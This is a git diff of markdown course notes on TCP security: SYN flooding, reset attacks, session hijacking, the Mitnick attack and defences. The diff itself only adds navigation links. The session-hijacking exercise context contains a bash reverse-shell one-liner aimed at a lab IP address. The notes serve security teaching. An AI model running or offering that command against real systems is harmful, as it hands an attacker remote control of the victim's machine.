@@ -9,6 +9,7 @@
 
 
 ## 5.2 The TCP Protocol and Attacks on TCP
+([top](#directory))
 
 ### The need for TCP
 
@@ -21,6 +22,7 @@
   - preserves order
 
 ## 5.3 TCP Client/Server Programming
+([top](#directory))
 
 ### TCP Client Program
 ```C
@@ -120,6 +122,7 @@ while (1) {
 - old socket needs to be used to wait for data
 
 ## 5.4 TCP Protocol: Buffer and Data Stream
+([top](#directory))
 
 ### TCP Protocl: Buffer and Data Stream
 - 4 buffers for tcp
@@ -156,6 +159,7 @@ while (1) {
     - if nework is broken, data will never be received and will terminate after a few tries
 
 ## 5.5 Flow and Congestion Control
+([top](#directory))
 
 ### Flow Control and Sliding Window
 
@@ -192,6 +196,7 @@ while (1) {
     - adjust sliding window
 
 ## 5.6 TCP Header
+([top](#directory))
 
 ### TCP Header
 - Source port
@@ -221,6 +226,8 @@ while (1) {
   - `RST`
 
 ## 5.7 SYN Flooding Attacks
+([top](#directory))
+
 ### Establishing Connections
 TCP 3-way handshake
 - tell each side what's my initial sequence number
@@ -249,6 +256,7 @@ TCP 3-way handshake
   - Only have to fill up the queue memory
 
 ## 5.8 Countermeasures
+([top](#directory))
 
 ### Countermeasures
 - distributed denial of service
@@ -265,6 +273,7 @@ we want to make the power ballance symemetric. If you have to use a lot of resou
   - send quiz, if solve quiz sender is serious, not going to SYN flood
 
 ## 5.9 Exercise: TCP Reset Attacks
+([top](#directory))
 
 ### Closing TCP Connections
 How do we close a connection?
@@ -307,6 +316,7 @@ How do we close a connection?
   - THIS IS SO YOU DON'T GET BLOCKED FROM YOUTUBE
 
 ## 5.10 Exercise: TCP Session Hijacking Attack
+([top](#directory))
 
 ### TCP Session Hijacking Attack
 - A telnet B
@@ -354,6 +364,7 @@ How do we close a connection?
 `/bin/bash -i > /dev/tcp/10.0.2.7/9090 2>&1 0<&1`
 
 ## 5.11 The Mitnick Attack
+([top](#directory))
 
 ### Mitnick Attack: Technical Details
 
@@ -371,6 +382,7 @@ How do we close a connection?
       - guess initial sequence number because it was predictable
 
 ## 5.12 Defending against TCP Attacks
+([top](#directory))
 
 ### Defend against TCP Attacks
 - Local
@@ -396,6 +408,8 @@ How do we close a connection?
 
 
 ## 5.13 Summary
+([top](#directory))
+
 - TCP Protocol
   - TCP vs UDP
   - TCP client/server programs
@@ -409,6 +423,8 @@ How do we close a connection?
   - encrypt data (use ssh)
 
 # Week 6 & 7 Live Session
+([top](#directory))
+
 ## Block cipher
 - in symmetric key encryption
   - need strong encryption alogrithm
@@ -420,4 +436,6 @@ what are the obvious reasons for doing the encryption in the hsm?
 - what is hsm?
 
 # Week 6 Live Session
+([top](#directory))
+
 ## Approaches to message authentication
